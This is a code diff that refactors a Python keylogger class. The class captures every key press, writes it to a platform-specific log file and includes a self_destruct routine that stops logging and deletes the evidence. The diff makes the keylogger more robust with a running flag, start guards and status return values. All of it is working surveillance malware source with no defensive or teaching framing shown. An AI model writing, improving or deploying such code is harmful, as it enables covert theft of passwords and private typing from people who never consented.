@@ -11,6 +11,7 @@ class Keylogger:
         self.flag = 0
         self.listener = None
         self._lock = threading.Lock()
+        self._running = False
         
         # Set the log file path based on platform
         if platform == 'win32':
@@ -27,11 +28,16 @@ class Keylogger:
             if not os.path.exists(self.path):
                 with open(self.path, 'w') as f:
                     f.write('')  # Create empty file
+            return True
         except Exception as e:
             print(f"Error creating log file: {e}")
+            return False
 
     def on_press(self, key):
         """Handle key press events"""
+        if not self._running:
+            return False  # Stop listener if not running
+            
         try:
             with self._lock:
                 self.keys.append(key)
@@ -41,7 +47,7 @@ class Keylogger:
                     self.count = 0
                     self.write_file(self.keys)
                     self.keys = []
-            return not self.flag  # Stop listener if flag is set
+            return True  # Continue listening
         except Exception as e:
             print(f"Error in on_press: {e}")
             return False  # Stop listener on error
@@ -93,19 +99,24 @@ class Keylogger:
                             f.write(f' [{k}] ')
                         else:
                             f.write(k)
+            return True
         except Exception as e:
             print(f"Error writing to log file: {e}")
+            return False
 
     def self_destruct(self):
         """Stop the keylogger and clean up"""
         try:
-            self.flag = 1
+            self._running = False
             if self.listener:
                 self.listener.stop()
+                self.listener = None
             if os.path.exists(self.path):
                 os.remove(self.path)
+            return True
         except Exception as e:
             print(f"Error in self_destruct: {e}")
+            return False
 
     def overwrite_file(self):
         """Clear the contents of the log file"""
@@ -114,18 +125,29 @@ class Keylogger:
             with self._lock:
                 with open(self.path, 'w') as f:
                     f.write('')
+            return True
         except Exception as e:
             print(f"Error clearing log file: {e}")
+            return False
 
     def start(self):
         """Start the keylogger"""
+        if self._running:
+            return False
+            
         try:
+            if not self._ensure_file_exists():
+                return False
+                
+            self._running = True
             self.listener = Listener(on_press=self.on_press)
             self.listener.start()
-            self.listener.join()
+            self.listener.join()  # This blocks until the listener stops
+            return True
         except Exception as e:
             print(f"Error starting keylogger: {e}")
-            self.flag = 1
+            self._running = False
+            return False
 
 if __name__ == '__main__':
     try:
